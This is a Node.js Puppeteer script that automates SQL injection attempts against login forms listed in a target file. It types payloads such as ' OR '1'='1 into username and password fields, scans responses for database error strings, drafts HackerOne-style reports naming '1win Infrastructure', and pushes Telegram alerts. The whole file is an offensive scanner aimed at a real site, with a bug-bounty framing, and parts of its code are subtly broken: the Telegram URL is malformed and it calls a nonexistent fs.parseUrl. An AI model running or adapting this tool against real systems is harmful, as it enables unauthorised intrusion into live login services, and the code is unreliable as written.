const puppeteer = require('puppeteer');
const fs = require('fs');
const https = require('https'); // Native Node utility to send API messages to Telegram

// ---------------------------------------------------------
// TELEGRAM CONFIGURATION PROFILE
// ---------------------------------------------------------
const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // Replace with your BotFather token
const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';     // Replace with your numeric user info ID
// ---------------------------------------------------------

const sqlPayloads = ["'", "' OR '1'='1", "admin' --"];
const sqlErrorSignatures = ["SQL syntax", "mysql_fetch_array", "MariaDB server version"];

const FORM_FIELDS = [
    { name: 'Username/Email Field', selector: 'input[name="username"]', safeValue: 'valid_test_user@example.com' },
    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
];

const SUBMIT_SELECTOR = 'button[type="submit"]';
const TARGET_FILE = 'paths.txt';

// Function to send real-time text alerts straight to your phone
function sendTelegramAlert(message) {
    const url = `https://telegram.org{TELEGRAM_BOT_TOKEN}/sendMessage`;
    const data = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
    });

    const options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(url, options, (res) => {});
    req.on('error', (e) => console.error(`[-] Telegram notification error: ${e.message}`));
    req.write(data);
    req.end();
}

function generateSQLiReportAndAlert(targetUrl, fieldName, payload, matchedSignature) {
    const reportFileName = `h1_report_SQLi_${fieldName.replace(/\s+/g, '_')}_${Date.now()}.md`;
    const reportContent = 
`# SQL Injection via ${fieldName} on 1win Infrastructure
## Affected Asset
* URL/Domain: ${targetUrl}
* Target Input Component: ${fieldName}
## Proof of Concept (PoC)
The backend server response explicitly leaked the following signature trace:
\`${matchedSignature}\`
`;

    fs.writeFileSync(reportFileName, reportContent);
    console.log(`[🎉 CRITICAL REPORT GENERATED!] Saved to: ${reportFileName}`);

    // Trigger instant Telegram mobile text alert payload
    const alertMessage = `🚨 *VULNERABILITY DETECTED!* 🚨\n\n*Target:* ${targetUrl}\n*Component:* ${fieldName}\n*Type:* SQL Injection\n*Signature Match:* \`${matchedSignature}\`\n\n📄 _HackerOne markdown file draft generated locally at: ${reportFileName}_`;
    sendTelegramAlert(alertMessage);
}

async function runTelegramHunter() {
    if (!fs.parseUrl && !fs.existsSync(TARGET_FILE)) {
        console.log(`[-] Error: Missing target tracking file listing: '${TARGET_FILE}'`);
        return;
    }

    const targets = fs.readFileSync(TARGET_FILE, 'utf8')
                     .split('\n')
                     .map(line => line.trim())
                     .filter(line => line.length > 0 && line.startsWith('http'));

    console.log(`[+] Launching Telegram-Linked Scanner Infrastructure across ${targets.length} endpoints...`);
    sendTelegramAlert(`🤖 *Hunter Pipeline Activated:* Monitoring ${targets.length} in-scope paths securely.`);

    const browser = await puppeteer.launch({ headless: true });

    for (let targetUrl of targets) {
        for (let targetField of FORM_FIELDS) {
            for (let payload of sqlPayloads) {
                const page = await browser.newPage();
                let lastServerResponseText = "";
                let sqliDetected = false;
                let matchedSig = "";

                page.on('response', async (response) => {
                    try {
                        const contentType = response.headers()['content-type'] || '';
                        if (contentType.includes('json') || contentType.includes('text')) {
                            lastServerResponseText = await response.text();
                            
                            for (let sig of sqlErrorSignatures) {
                                if (lastServerResponseText.includes(sig)) {
                                    sqliDetected = true;
                                    matchedSig = sig;
                                }
                            }
                        }
                    } catch (err) {}
                });

                try {
                    await page.goto(targetUrl, { waitUntil: 'networkidle2', timeout: 15000 });

                    const inputExists = await page.$(targetField.selector);
                    if (!inputExists) {
                        await page.close();
                        break;
                    }

                    for (let currentField of FORM_FIELDS) {
                        await page.waitForSelector(currentField.selector, { timeout: 4000 });
                        await page.click(currentField.selector);
                        await page.keyboard.down('Control');
                        await page.keyboard.press('A');
                        await page.keyboard.up('Control');
                        await page.keyboard.press('Backspace');

                        if (currentField.name === targetField.name) {
                            await page.type(currentField.selector, payload);
                        } else {
                            await page.type(currentField.selector, currentField.safeValue);
                        }
                    }

                    await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
                    await Promise.all([
                        page.click(SUBMIT_SELECTOR),
                        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
                    ]);

                    if (sqliDetected) {
                        generateSQLiReportAndAlert(targetUrl, targetField.name, payload, matchedSig);
                    }

                } catch (error) {
                    // Handle edge cases, element omissions, or request drops safely
                } finally {
                    await page.close();
                }
            }
        }
    }

    console.log(`\n[+] Inspection Campaign Finished.`);
    sendTelegramAlert(`🏁 *Hunter Pipeline Completed:* All sequential target passes checked successfully.`);
    await browser.close();
}

runTelegramHunter();
